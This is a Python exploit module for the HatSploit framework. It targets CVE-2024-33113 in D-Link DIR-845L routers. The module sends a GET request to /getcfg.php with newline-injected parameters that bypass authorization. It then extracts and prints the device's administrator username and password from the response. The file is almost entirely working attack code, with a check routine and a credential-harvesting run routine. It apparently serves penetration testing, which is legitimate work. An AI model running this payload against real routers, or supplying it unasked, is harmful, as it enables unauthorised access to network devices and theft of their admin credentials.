"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import re

from hatsploit.lib.core.module.basic import *
from hatsploit.lib.core.module.proto import HTTP


class HatSploitModule(Module, HTTP):
    def __init__(self):
        super().__init__({
            'Category': "exploit",
            'Name': "D-Link DIR-845L Credentials Disclosure",
            'Module': "exploit/linux/dlink/dir845l_credentials_disclosure",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
                "Roberto Paleari - vulnerability researcher",
            ],
            'Description': (
                "D-Link DIR-845L <= 1.01KRb03 credentials disclosure exploit."
            ),
            'Platform': OS_LINUX,
            'Rank': HIGH_RANK,
            'Devices': [
                "D-Link DIR-845L <= v1.01KRb03",
            ],
            'References': [
                {'URL': 'https://nvd.nist.gov/vuln/detail/CVE-2024-33113'},
                {'CVE': '2024-33113'}
            ],
            'DisclosureDate': "2024-06-05",
            'Notes': {
                'Stability': [CRASH_SAFE],
                'Reliability': [],
                'SideEffects': [],
            }
        })

    def check(self):
        response = self.http_request(
            method="GET",
            path='/getcfg.php?a=%0A_POST_SERVICES=DEVICE.ACCOUNT%0AAUTHORIZED_GROUP=1'
        )

        if response and response.status_code == 200:
            return True

        return False

    def run(self):
        response = self.http_request(
            method="GET",
            path='/getcfg.php?a=%0A_POST_SERVICES=DEVICE.ACCOUNT%0AAUTHORIZED_GROUP=1'
        )

        username = re.findall("<name>(.+?)</name>", re.sub(r'\s+', '', response.text))
        password = re.findall("<password>(|.+?)</password>", re.sub(r'\s+', '', response.text))

        if not username and not password:
            self.print_warning("Target vulnerable, but no credentials found.")
            return

        creds = [
            (username[0] if username else 'Admin',
             password[0] if password else '')
        ]
        self.print_table("Credentials", ('Username', 'Password'), *creds)
